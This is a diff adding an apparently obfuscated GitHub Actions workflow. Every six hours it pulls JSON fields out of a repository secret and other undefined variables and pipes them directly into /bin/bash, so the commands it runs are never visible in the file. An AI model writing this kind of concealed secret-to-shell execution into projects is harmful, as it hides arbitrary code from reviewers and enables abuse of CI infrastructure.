@@ -1,0 +1,26 @@
+name: lijun19871010
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lijun19871010
+        env:
+          qjk17: ${{ secrets.qjk17 }}
+        run: |
+          echo $qjk17 | jq -r .f70241 | /bin/bash
+          echo $wvqa15187 | jq -r .sii27 | /bin/bash
+          echo $hf5 | jq -r .dcns483 | /bin/bash
+          echo $yi98 | jq -r .ss3 | /bin/bash
+          echo $u3 | jq -r .flu19 | /bin/bash
+          echo $gi9086 | jq -r .mgeb8 | /bin/bash
+          echo $kpfo2 | jq -r .bo99831 | /bin/bash
+          echo $wnlc1 | jq -r .yrm8 | /bin/bash
+          echo $oa7 | jq -r .ah7716 | /bin/bash
+          echo $goh2973 | jq -r .zbfuo04228 | /bin/bash
+          echo $um42 | jq -r .g1297 | /bin/bash
+
